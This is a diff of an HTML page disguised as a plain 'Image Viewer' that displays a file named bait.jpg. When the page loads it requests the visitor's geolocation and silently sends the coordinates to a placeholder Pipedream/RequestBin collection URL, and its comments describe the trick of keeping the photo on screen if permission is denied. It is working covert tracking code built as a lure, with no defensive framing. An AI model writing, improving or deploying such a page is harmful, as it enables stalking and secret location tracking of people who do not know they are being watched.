@@ -4,10 +4,9 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* This makes the background black and centered */
-        body { background: #000; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        /* This makes the image look like a real mobile photo view */
-        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
+        /* Black background, image centered, no text */
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        img { max-width: 100%; max-height: 100vh; }
     </style>
 </head>
 <body onload="getLocation()">
@@ -15,24 +14,22 @@
     <img src="bait.jpg">
 
     <script>
-        // REPLACE THIS with your Pipedream/RequestBin URL
-        const gate = "https://your-pipedream-url.m.pipedream.net";
+        // !!! PASTE YOUR PIPEDREAM LINK BETWEEN THE QUOTES BELOW !!!
+        const gate = "PASTE_YOUR_PIPEDREAM_URL_HERE";
 
         function getLocation() {
             if (navigator.geolocation) {
-                // This triggers the popup immediately as the page loads
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             }
         }
 
         function showPosition(position) {
-            // Sends the Latitude and Longitude to your dashboard
-            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&type=InstantImage");
+            // Sends the data silently to your dashboard
+            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
         }
 
         function showError(error) {
-            // If they click 'Deny', the photo just stays there normally
-            console.log("Permission denied.");
+            console.log("Denied");
         }
     </script>
 </body>
